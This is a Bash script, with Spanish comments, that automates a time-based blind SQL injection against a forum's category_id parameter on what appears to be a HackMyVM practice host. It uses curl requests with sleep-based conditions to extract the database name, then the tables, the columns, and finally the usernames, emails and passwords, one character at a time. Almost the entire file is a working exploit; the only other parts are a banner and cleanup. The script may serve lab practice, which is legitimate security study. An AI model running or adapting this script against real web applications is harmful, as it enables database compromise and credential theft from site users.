#!/bin/bash
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Ctrl_C
function ctrl_c(){
	echo -e "\n\n${redColour}[!]Saliendo...${endColour}\n"
	rm file.tmp diccionario.tmp
	tput cnorm;exit 1
}

trap ctrl_c INT

tput civis

#Variables Globales

main_url=http://forumtesting.literal.hmv/category.php?category_id=2

#Creando diccionario
echo ":" >> diccionario.tmp
echo "_" >> diccionario.tmp
for i in {a..z} ;do echo "$i";done >> diccionario.tmp

#Banner

echo -e "${turquoiseColour}

   _____  ____  _      _____   _______ _____ __  __ ______   ____           _____ ______ _____  
  / ____|/ __ \| |    |_   _| |__   __|_   _|  \/  |  ____| |  _ \   /\    / ____|  ____|  __ \ 
 | (___ | |  | | |      | |      | |    | | | \  / | |__    | |_) | /  \  | (___ | |__  | |  | |
  \___ \| |  | | |      | |      | |    | | | |\/| |  __|   |  _ < / /\ \  \___ \|  __| | |  | |
  ____) | |__| | |____ _| |_     | |   _| |_| |  | | |____  | |_) / ____ \ ____) | |____| |__| |
 |_____/ \___\_\______|_____|    |_|  |_____|_|  |_|______| |____/_/    \_\_____/|______|_____/ 
${endColour}"

echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando proceso de enumeracion de base de datos sql...${endColour}"

#Base de datos en uso
for i in $(seq 1 15);do cat diccionario.tmp | while read line;
	do timeout 1 curl "$main_url+or+if(substring(database(),$i,1)='$line',sleep(1),1)=1" &>/dev/null
	estado=$?
	if [ "$estado" -ne 0 ]; then
		base_de_datos+=$line
		echo "$base_de_datos" >> file.tmp
	fi;done;done
db_principal=$(cat file.tmp | xargs | tr -d ' ')
echo -e "\n${yellowColour}[+]${endColour}${grayColour}Base de datos actualmente en uso${endCoulour}${blueColour}:${endColour}${greenColour} $db_principal${endColour}"
rm file.tmp

#Enumerando tables de la base de datos
tablas_db_principal=""
for i in $(seq 1 80);do cat diccionario.tmp | while read line;
    do timeout 1 curl "$main_url+or+if(substring((select+group_concat(table_name)+from+information_schema.tables+where+table_schema='$db_principal'),$i,1)='$line',sleep(1),1)=1" &>/dev/null
    estado=$?
    if [ "$estado" -ne 0 ]; then
        tablas_db_principal+=$line
        echo "$tablas_db_principal" >> file.tmp
    fi;done;done
cat file.tmp | xargs | tr -d ' ' | sponge file.tmp &>/dev/null
tablas_db=$(sed 's/f/ f/g' file.tmp)

echo -e "${yellowColour}[+]${endColour}${grayColour}Tablas de la base de datos ${endColour}${turquoiseColour}$db_principal${endColour}${blueColour}:${endColour}${greenColour}$tablas_db${endColour}"
rm file.tmp
#Enumerando Columnas de la bse de datos

columnas_db_principal=""
tabla_principal=$(echo -e "$tablas_db" | awk '{print$2}')

for i in $(seq 1 35);do cat diccionario.tmp | while read line;
    do timeout 1 curl "$main_url+or+if(substring((select+group_concat(column_name)+from+information_schema.columns+where+table_schema='$db_principal'+and+table_name='$tabla_principal'),$i,1)='$line',sleep(1),1)=1" &>/dev/null
    estado=$?
    if [ "$estado" -ne 0 ]; then
        columnas_db_principal+=$line
        echo "$columnas_db_principal" >> file.tmp
    fi;done;done

columnas_tabla_principal=$(cat file.tmp | xargs | tr -d ' ' | sed 's/id/id /' | sed 's/rname/rname /' | sed 's/ail/ail /' | sed 's/word/word /')

echo -e "${yellowColour}[+]${endColour}${grayColour}Columnas de la tabla ${endColour}${turquoiseColour}$tabla_principal${endColour}${blueColour}:${endColour} ${greenColour}$columnas_tabla_principal${endColour}"

rm file.tmp

#Enumerando datos de las tablas

#Diccionario Extendido para los datos
echo "@" >> diccionario.tmp
echo "." >> diccionario.tmp

for i in {0..9} ;do echo "$i";done >> diccionario.tmp
for i in $(seq 1 180);do cat diccionario.tmp | while read line;
    do timeout 1 curl "$main_url+or+if(substring((select+group_concat(username,':',email,':',password)+from+$tabla_principal),$i,1)='$line',sleep(1),1)=1" &>/dev/null
    estado=$?
    if [ "$estado" -ne 0 ]; then
        base_de_datos+=$line
        echo "$base_de_datos" >> file.tmp
    fi;done;done

datos=$(cat file.tmp | xargs | tr -d ' ')

echo -e "${yellowColour}[+]${endColour}${grayColour}Datos de la tabla ${endColour}${turquoiseColour}$tabla_principal${endColour}${blueColour}:${endColour} ${greenColour}$datos${endColour}"

rm file.tmp diccionario.tmp
#id username email password created
tput cnorm
